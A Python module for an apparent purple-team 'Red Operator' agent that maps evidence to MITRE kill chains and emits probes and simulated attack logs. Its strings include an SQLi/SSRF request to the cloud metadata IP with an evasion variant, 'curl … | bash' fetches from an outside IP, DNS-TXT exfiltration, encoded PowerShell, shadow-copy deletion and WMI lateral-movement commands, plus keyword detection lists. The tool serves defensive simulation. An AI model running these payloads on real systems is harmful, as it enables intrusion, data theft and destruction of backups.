"""Penetrating Red Operator & Attack Emulation Agent."""

from __future__ import annotations

import re
from typing import Any, Dict, List

from hermes_cyber.models import (
    ArtifactIngestionResult,
    EvidenceRecord,
    MitreStep,
    RedOperationPlan,
    RedProbe,
    SimulatedAttackEvent,
)
from hermes_cyber.observer import PrivacyScrubber
from hermes_cyber.router_bridge import ModelRouter, invoke_router_json


def _has_any(text: str, needles: tuple[str, ...]) -> bool:
    low = text.lower()
    return any(n in low for n in needles)


def _format_evidence_bundle(ingestion: ArtifactIngestionResult) -> str:
    return "\n".join(f"[{ev.evidence_id}] ({ev.source_type}) {ev.raw_content}" for ev in ingestion.evidences)


def _synthesize_deterministic_red_plan(ingestion: ArtifactIngestionResult) -> RedOperationPlan:
    """Analyze ingested code/config/logs deterministically to produce MITRE kill-chain, safe probes, and evasion events."""
    threat_evs = [ev for ev in ingestion.evidences if not ev.is_benign_baseline]
    all_raw = "\n".join(ev.raw_content for ev in threat_evs)
    cited: List[str] = []
    kill_chain: List[MitreStep] = []
    probes: List[RedProbe] = []
    sim_events: List[SimulatedAttackEvent] = []
    blind_spots: List[str] = []

    def _evs_matching(pred) -> List[str]:
        matched = [ev.evidence_id for ev in threat_evs if pred(ev)]
        for eid in matched:
            if eid not in cited:
                cited.append(eid)
        return matched

    # Track 1: Code / IaC SQLi -> SSRF -> IMDS -> Container Escape chain
    sql_evs = [
        e.evidence_id
        for e in threat_evs
        if "sql_concat" in e.entities.get("sinks", []) or "union select" in e.raw_content.lower()
    ]
    ssrf_evs = [
        e.evidence_id
        for e in threat_evs
        if "ssrf_fetch" in e.entities.get("sinks", []) or "169.254.169.254" in e.raw_content
    ]
    priv_evs = [
        e.evidence_id
        for e in threat_evs
        if "container_priv" in e.entities.get("sinks", []) or "privileged: true" in e.raw_content.lower()
    ]

    if (sql_evs and ssrf_evs) or "169.254.169.254" in all_raw:
        for eid in [*sql_evs, *ssrf_evs, *priv_evs]:
            if eid not in cited:
                cited.append(eid)
        ep = next((ep for ev in threat_evs for ep in ev.entities.get("endpoints", [])), "/api/v1/export")
        if sql_evs:
            kill_chain.append(MitreStep(
                tactic="Initial Access",
                technique_id="T1190",
                technique_name="Exploit Public-Facing Application (SQLi -> SSRF Pivot)",
                description="String concatenation in SQL filter lets attacker inject controlled webhook URL or extract DB records.",
                evidence_ids=sql_evs,
                reachability_proof=f"Externally reachable route `{ep}` concatenates untrusted parameter directly into SQL string.",
            ))
        if ssrf_evs:
            kill_chain.append(MitreStep(
                tactic="Credential Access",
                technique_id="T1552.005",
                technique_name="Cloud Instance Metadata API (SSRF)",
                description="Unvalidated URL fetch allows pivoting directly to cloud IMDS endpoint (169.254.169.254) for IAM tokens.",
                evidence_ids=ssrf_evs,
                reachability_proof="Function parameter flows directly into `requests.get(webhook_url)` without CIDR/host allowlist.",
            ))
        if priv_evs:
            kill_chain.append(MitreStep(
                tactic="Privilege Escalation",
                technique_id="T1611",
                technique_name="Escape to Host via Privileged Container",
                description="Privileged pod security context amplifies SSRF/RCE compromise to node-level host breakout.",
                evidence_ids=priv_evs,
                reachability_proof="Deployment manifest explicitly sets `privileged: true` and `allowPrivilegeEscalation: true`.",
            ))
        probes.append(RedProbe(
            probe_id="RED-PRB-01",
            title="Non-destructive SQLi + Loopback SSRF Reachability Check",
            target_surface=ep,
            method_or_vector="HTTP GET safe-canary probe",
            payload_or_command=f"GET {ep}?tenant_id=1'+AND+'1'='1&webhook_url=http://169.254.169.254/latest/meta-data/",
            expected_ioc="200 OK with metadata key names or SQL parser syntax delta in response",
        ))
        sim_events.append(SimulatedAttackEvent(
            event_id="SIM-RED-01",
            variant="baseline_attack",
            log_line=f'src=198.51.100.88 method=GET {ep}?tenant_id=%27+UNION+SELECT+1&webhook_url=http://169.254.169.254/latest/meta-data/ status=200',
            mitre_technique_id="T1190",
        ))
        sim_events.append(SimulatedAttackEvent(
            event_id="SIM-RED-02",
            variant="evasion_variant",
            log_line=f'src=198.51.100.89 method=GET {ep}?tenant_id=1%2f**%2fuNiOn%2f**%2fsElEcT&webhook_url=http://0251.0376.0251.0376/latest/meta-data/ status=200',
            mitre_technique_id="T1552.005",
        ))
        blind_spots.append("Simple regex blocks on `169.254.169.254` fail against octal/decimal IP aliases (0251.0376.0251.0376) and `UNION` SQL comment evasion.")
        return RedOperationPlan(
            primary_hypothesis="Exploitable Multi-Hop Chain: SQL Injection feeding Cloud Metadata SSRF in a Privileged Pod.",
            confidence=0.92,
            kill_chain=kill_chain,
            blind_spots=blind_spots,
            probes=probes,
            simulated_events=sim_events,
            cited_evidence_ids=cited,
            model_used="deterministic",
        )

    # Track 2: Token Leak + Encoded PowerShell + DNS Exfiltration (or Deserialization / Shell Spawn)
    dns_evs = [e.evidence_id for e in threat_evs if _has_any(e.raw_content, ("qtype=txt", "c2-sync"))]
    exec_evs = [
        e.evidence_id
        for e in threat_evs
        if _has_any(e.raw_content, ("powershell", "sh -c", "pickle.loads", "curl ", "vssadmin"))
    ]
    token_evs = [e.evidence_id for e in threat_evs if _has_any(e.raw_content, ("token_leak",))]

    if dns_evs or token_evs:
        cited = list(dict.fromkeys([*token_evs, *exec_evs, *dns_evs]))
        if token_evs:
            kill_chain.append(MitreStep(
                tactic="Credential Access",
                technique_id="T1528",
                technique_name="Steal Application Access Token",
                description="Leaked JWT bearer credential grants authenticated pivot capability on database/ETL tier.",
                evidence_ids=token_evs,
                reachability_proof="Raw token exposure event observed on internal service host prior to execution.",
            ))
        if exec_evs:
            kill_chain.append(MitreStep(
                tactic="Execution",
                technique_id="T1059.001",
                technique_name="Command and Scripting Interpreter (Encoded PowerShell)",
                description="Database worker spawned encoded PowerShell payload obfuscating staging collector.",
                evidence_ids=exec_evs,
                reachability_proof="Unexpected `child_of=mysqld` process lineage spawning `powershell.exe -enc`.",
            ))
        if dns_evs:
            kill_chain.append(MitreStep(
                tactic="Exfiltration",
                technique_id="T1048.003",
                technique_name="Exfiltration Over Alternative Protocol (DNS TXT)",
                description="High-entropy Base32 DNS TXT chunks bypass HTTP proxy inspection masked by DDoS noise.",
                evidence_ids=dns_evs,
                reachability_proof="Repeated high-entropy (>4.8) DNS TXT labels destined for external domain `c2-sync`.",
            ))
        probes.append(RedProbe(
            probe_id="RED-PRB-02",
            title="Egress DNS TXT Tunneling & Process Lineage Verification",
            target_surface="db-core-02 egress resolver + mysqld child processes",
            method_or_vector="Canary TXT DNS lookup audit + parent-child process query",
            payload_or_command="dig +short TXT canaryprobe01.exfil.c2-sync.example.net @resolver",
            expected_ioc="DNS firewall alert triggered on unauthorized TXT entropy > 4.2 or mysqld->shell fork",
        ))
        sim_events.extend([
            SimulatedAttackEvent(
                event_id="SIM-RED-01",
                variant="baseline_attack",
                log_line='dns_src=10.10.4.22 qtype=TXT query="JBSWY3DPEBLW64TMMQ.exfil.c2-sync.example.net" proc=powershell.exe cmd="powershell -enc SQBFAFgA" entropy=4.9',
                mitre_technique_id="T1048.003",
            ),
            SimulatedAttackEvent(
                event_id="SIM-RED-02",
                variant="evasion_variant",
                log_line='dns_src=10.10.4.22 qtype=CNAME query="a1b2c3d4e5.sync.c2-sync.example.net" proc=pwsh cmd="pwsh -EncodedCommand QQBiAEM=" entropy=4.7',
                mitre_technique_id="T1048.003",
            ),
        ])
        blind_spots.append("SOC threshold alerts focus on HTTP 503 flood while low-rate DNS TXT/CNAME egress runs unnoticed.")
        return RedOperationPlan(
            primary_hypothesis="Active Multi-Stage Intrusion: DDoS distraction masking token theft, encoded execution, and DNS C2 exfiltration.",
            confidence=0.90,
            kill_chain=kill_chain,
            blind_spots=blind_spots,
            probes=probes,
            simulated_events=sim_events,
            cited_evidence_ids=cited,
            model_used="deterministic",
        )

    if _has_any(all_raw, ("pickle.loads", "waf_status=allowed", "sh -c")):
        kill_chain.append(MitreStep(
            tactic="Defense Evasion",
            technique_id="T1190",
            technique_name="WAF Header Smuggling / Unsafe Deserialization",
            description="Payload delivered inside Base64 header/body bypasses query-only WAF rules and hits `pickle.loads`.",
            evidence_ids=threat_evs[:2] and [e.evidence_id for e in threat_evs[:3]],
            reachability_proof="`X-Token-Fmt=base64` decoded directly into `pickle.loads()` triggering `posix.system`.",
        ))
        kill_chain.append(MitreStep(
            tactic="Execution",
            technique_id="T1059.004",
            technique_name="Unix Shell Reverse Staging (`sh -c curl`)",
            description="App worker `python3` forked `sh -c curl ... | bash` with outbound callback.",
            evidence_ids=exec_evs,
            reachability_proof="Process telemetry shows `parent_proc=python3 proc=sh` + immediate egress.",
        ))
        cited = list(dict.fromkeys([eid for step in kill_chain for eid in step.evidence_ids]))
        probes.append(RedProbe(
            probe_id="RED-PRB-03",
            title="Header Deserialization Boundary Verification",
            target_surface="/api/v2/session/restore",
            method_or_vector="POST malformed non-exec JSON/base64 probe",
            payload_or_command="POST /api/v2/session/restore X-Token-Fmt: base64 body=e30=",
            expected_ioc="Endpoint must reject with 400 JSON-only error rather than invoking pickle deserialization",
        ))
        sim_events.extend([
            SimulatedAttackEvent(
                event_id="SIM-RED-01",
                variant="baseline_attack",
                log_line='method=POST /api/v2/session/restore proc=sh cmd="sh -c curl http://91.132.147.18/s.sh | bash" pickle.loads',
                mitre_technique_id="T1059.004",
            ),
            SimulatedAttackEvent(
                event_id="SIM-RED-02",
                variant="evasion_variant",
                log_line='method=POST /api/v2/session/restore proc=dash cmd="/bin/sh -c wget -qO- http://91.132.147.18/s.sh" parent_proc=python3',
                mitre_technique_id="T1059.004",
            ),
        ])
        blind_spots.append("Edge WAF inspects only URL query parameters, ignoring serialized Base64 blobs and python3->sh forks.")
        return RedOperationPlan(
            primary_hypothesis="WAF Bypass & Insecure Pickle Deserialization leading to Web Worker Remote Code Execution.",
            confidence=0.91,
            kill_chain=kill_chain,
            blind_spots=blind_spots,
            probes=probes,
            simulated_events=sim_events,
            cited_evidence_ids=cited,
            model_used="deterministic",
        )

    # Track 3: Ransomware-like / BruteForce / Lateral Movement (superficial alarm hypothesis A for Critic to challenge!)
    r_evs = _evs_matching(lambda e: _has_any(e.raw_content, ("vssadmin", "writes_enc_ext", "encrypted")))
    if r_evs:
        kill_chain.append(MitreStep(
            tactic="Impact",
            technique_id="T1490",
            technique_name="Inhibit System Recovery / Suspect Bulk Encryption",
            description="Shadow copy enumeration via `vssadmin.exe` paired with high-entropy bulk writes and TLS egress.",
            evidence_ids=r_evs,
            reachability_proof="Telemetry records `vssadmin list shadows` followed by 1,420 `.enc` writes.",
        ))
        probes.append(RedProbe(
            probe_id="RED-PRB-04",
            title="Shadow Copy & Binary Provenance Audit",
            target_surface="srv-fin-01 process restic / vssadmin",
            method_or_vector="Read-only binary signature & change ticket cross-check",
            payload_or_command="Get-AuthenticodeSignature / vssadmin list shadows provenance",
            expected_ioc="Unverified unsigned binary or missing CHG ticket confirms ransomware; trusted signer refutes it",
        ))
        sim_events.extend([
            SimulatedAttackEvent(
                event_id="SIM-RED-01",
                variant="baseline_attack",
                log_line='proc=vssadmin.exe cmd="vssadmin delete shadows /all /quiet" ransomware_note=true writes_enc_ext=2500',
                mitre_technique_id="T1486",
            ),
            SimulatedAttackEvent(
                event_id="SIM-RED-02",
                variant="evasion_variant",
                log_line='proc=wbadmin.exe cmd="wbadmin delete catalog -quiet" vss_deleted=true writes_enc_ext=980 signature_verified=false',
                mitre_technique_id="T1490",
            ),
        ])
        return RedOperationPlan(
            primary_hypothesis="Suspected Ransomware Encryption & Shadow Copy Manipulation on srv-fin-01.",
            confidence=0.68,
            kill_chain=kill_chain,
            blind_spots=["Process-only alerts cannot distinguish ransomware from signed Change-Control backups without signer/VLAN checks."],
            probes=probes,
            simulated_events=sim_events,
            cited_evidence_ids=cited,
            model_used="deterministic",
        )

    bf_evs = _evs_matching(lambda e: _has_any(e.raw_content, ("auth=failed", "bruteforce")))
    if bf_evs:
        kill_chain.append(MitreStep(
            tactic="Credential Access",
            technique_id="T1110",
            technique_name="Brute Force / High-Frequency Failed Logins",
            description="Repeated failed authentication requests against `/api/v1/metrics` for `svc_metrics`.",
            evidence_ids=bf_evs,
            reachability_proof="350 failed auth events recorded against a single API endpoint.",
        ))
        probes.append(RedProbe(
            probe_id="RED-PRB-05",
            title="Service Principal Lockout & Rate-Limit Resilience Check",
            target_surface="/api/v1/metrics",
            method_or_vector="Auth policy & rate-limit configuration inspection",
            payload_or_command="Inspect failed_auth threshold & password rotation sync on prometheus-poller cronjob",
            expected_ioc="Account lockout triggered or external IP spray without User-Agent match confirms hostile brute-force",
        ))
        sim_events.extend([
            SimulatedAttackEvent(
                event_id="SIM-RED-01",
                variant="baseline_attack",
                log_line='src=185.220.101.4 endpoint=/api/v1/metrics auth=FAILED user=admin password_spray_targets=25 external_ingress=true',
                mitre_technique_id="T1110",
            ),
            SimulatedAttackEvent(
                event_id="SIM-RED-02",
                variant="evasion_variant",
                log_line='src=185.220.101.9 endpoint=/api/v1/metrics auth=FAILED user=svc_metrics agent="Mozilla/5.0" external_ingress=true',
                mitre_technique_id="T1110.003",
            ),
        ])
        return RedOperationPlan(
            primary_hypothesis="Suspected Credential Brute Force targeting svc_metrics.",
            confidence=0.64,
            kill_chain=kill_chain,
            blind_spots=["Threshold SIEM rules trigger blindly without correlating internal password rotation events."],
            probes=probes,
            simulated_events=sim_events,
            cited_evidence_ids=cited,
            model_used="deterministic",
        )

    # Track 4: Explicit WMI/SMB lateral movement telemetry
    lat_evs = _evs_matching(lambda e: _has_any(e.raw_content, ("smb", "wmi", "wmic", "4624", "pass-the-hash")))
    if lat_evs:
        kill_chain.append(MitreStep(
            tactic="Lateral Movement",
            technique_id="T1047",
            technique_name="Windows Management Instrumentation / Admin Pivot",
            description="Remote WMI/SMB administrative activity detected across workstation-to-server telemetry.",
            evidence_ids=lat_evs,
            reachability_proof="Host session / remote WMI command telemetry observed in cited records.",
        ))
        probes.append(RedProbe(
            probe_id="RED-PRB-06",
            title="Admin Session Provenance & LogonType Discrimination",
            target_surface="auth / kerberos / vpn-gw",
            method_or_vector="Cross-log authentication verification",
            payload_or_command="Query Security Event 4624 LogonType + TicketEncryption + VPN session table",
            expected_ioc="RC4 NTLM LogonType=3 without VPN session confirms Pass-the-Hash compromise",
        ))
        sim_events.extend([
            SimulatedAttackEvent(
                event_id="SIM-RED-01",
                variant="baseline_attack",
                log_line='host=db-prod-01 proto=SMB proc=wmic cmd="wmic /node:db-prod-01 process call create" TicketEncryption=RC4 LogonType=3',
                mitre_technique_id="T1047",
            ),
            SimulatedAttackEvent(
                event_id="SIM-RED-02",
                variant="evasion_variant",
                log_line='host=db-prod-01 proto=DCOM proc=powershell.exe cmd="Invoke-CimMethod -ClassName Win32_Process" LogonType=3',
                mitre_technique_id="T1021",
            ),
        ])
        return RedOperationPlan(
            primary_hypothesis="Suspected Privileged Lateral Movement via WMI/SMB telemetry.",
            confidence=0.62,
            kill_chain=kill_chain,
            blind_spots=["Missing VPN/Kerberos logon correlation leaves legitimate emergency admin vs stolen token indistinguishable."],
            probes=probes,
            simulated_events=sim_events,
            cited_evidence_ids=cited,
            model_used="deterministic",
        )

    # Track 4b: Generic code/command sinks or explicit security threat indicators
    sink_evs = _evs_matching(lambda e: bool(e.entities.get("sinks")) or bool(e.entities.get("indicators")))
    if sink_evs:
        sink_id_set = set(sink_evs)
        matched_sink_records = [e for e in threat_evs if e.evidence_id in sink_id_set]
        kill_chain.append(MitreStep(
            tactic="Execution",
            technique_id="T1059",
            technique_name="Potentially Unsafe Sink / Threat Indicator Detected",
            description="Security indicators or dangerous execution/config sinks identified verbatim in submitted artifact.",
            evidence_ids=sink_evs,
            reachability_proof=f"Matched concrete sinks/indicators in {', '.join(sink_evs[:4])}.",
        ))
        probes.append(RedProbe(
            probe_id="RED-PRB-07",
            title="Controlled Sink Reachability & Validation Audit",
            target_surface=ingestion.title,
            method_or_vector="Safe boundary input validation check",
            payload_or_command=f"Inspect data-flow into sinks recorded in {', '.join(sink_evs[:3])}",
            expected_ioc="Unhandled untrusted data reaching sink confirms exploitability",
        ))
        sim_events.append(SimulatedAttackEvent(
            event_id="SIM-RED-01",
            variant="baseline_attack",
            log_line=matched_sink_records[0].raw_content,
            mitre_technique_id="T1059",
        ))
        return RedOperationPlan(
            primary_hypothesis="Concrete execution/config sink or threat indicator observed in submitted records.",
            confidence=0.72,
            kill_chain=kill_chain,
            blind_spots=["Inspect upstream input sanitization and runtime egress isolation."],
            probes=probes,
            simulated_events=sim_events,
            cited_evidence_ids=cited,
            model_used="deterministic",
        )

    # Track 5: Benign or neutral telemetry -> abstain without inventing nonexistent attack scenarios
    return RedOperationPlan(
        primary_hypothesis="No concrete offensive kill-chain or exploit indicator identified in submitted records.",
        confidence=0.15,
        kill_chain=[],
        blind_spots=["Telemetry contains no exploit sinks, error anomalies, or lateral-movement indicators."],
        probes=[],
        simulated_events=[],
        cited_evidence_ids=[],
        model_used="deterministic",
    )


class RedOperatorAgent:
    """Offensive Red Team agent constructing MITRE chains, safe-audit probes, and attack simulations."""

    def analyze(
        self,
        ingestion: ArtifactIngestionResult,
        router: Optional[ModelRouter] = None,
    ) -> Tuple[RedOperationPlan, bool, Dict[str, int]]:
        base_plan = _synthesize_deterministic_red_plan(ingestion)
        if router is None:
            return base_plan, False, {"private_ips": 0, "secrets": 0, "emails": 0}

        sys_prompt = (
            "You are the RED OPERATOR in a Purple Team cyber audit. Analyze ONLY the cited [EV-xxxx] records. "
            "Reply strictly with JSON keys: primary_hypothesis (string), confidence (0..1), "
            "blind_spots (list of short strings), extra_probes (list of {title, payload_or_command, expected_ioc}), "
            "and cited_evidence_ids (list of EV-xxxx IDs)."
        )
        user_prompt = (
            f"Artifact Title: {ingestion.title}\nKind: {ingestion.source_kind}\nRecords:\n"
            f"{_format_evidence_bundle(ingestion)}"
        )
        parsed, model_label, scrubbed, scrub_stats = invoke_router_json(
            router,
            system_prompt=sys_prompt,
            user_prompt=user_prompt,
            scrubber=PrivacyScrubber(),
        )
        if not parsed:
            return base_plan, scrubbed, scrub_stats

        valid_ids = {ev.evidence_id for ev in ingestion.evidences}
        llm_cited = [str(eid) for eid in (parsed.get("cited_evidence_ids") or []) if str(eid) in valid_ids]
        merged_cited = list(dict.fromkeys([*base_plan.cited_evidence_ids, *llm_cited]))
        extra_blind = [str(b).strip() for b in (parsed.get("blind_spots") or []) if str(b).strip()]
        merged_blind = list(dict.fromkeys([*base_plan.blind_spots, *extra_blind]))[:6]

        extra_probes: List[RedProbe] = list(base_plan.probes)
        for idx, p in enumerate(parsed.get("extra_probes") or [], start=len(extra_probes) + 1):
            if isinstance(p, dict) and p.get("payload_or_command"):
                extra_probes.append(RedProbe(
                    probe_id=f"RED-LLM-{idx:02d}",
                    title=str(p.get("title") or "LLM Audit Probe"),
                    target_surface=str(p.get("target_surface") or ingestion.title),
                    method_or_vector="LLM-suggested safe-audit",
                    payload_or_command=str(p["payload_or_command"]),
                    expected_ioc=str(p.get("expected_ioc") or "Inspect response telemetry"),
                ))

        hyp = str(parsed.get("primary_hypothesis") or "").strip() or base_plan.primary_hypothesis
        try:
            conf = max(0.0, min(1.0, float(parsed.get("confidence", base_plan.confidence))))
        except Exception:
            conf = base_plan.confidence

        enriched = base_plan.model_copy(update={
            "primary_hypothesis": hyp,
            "confidence": round((base_plan.confidence + conf) / 2.0, 3),
            "blind_spots": merged_blind,
            "probes": extra_probes[:5],
            "cited_evidence_ids": merged_cited,
            "model_used": model_label,
        })
        return enriched, scrubbed, scrub_stats
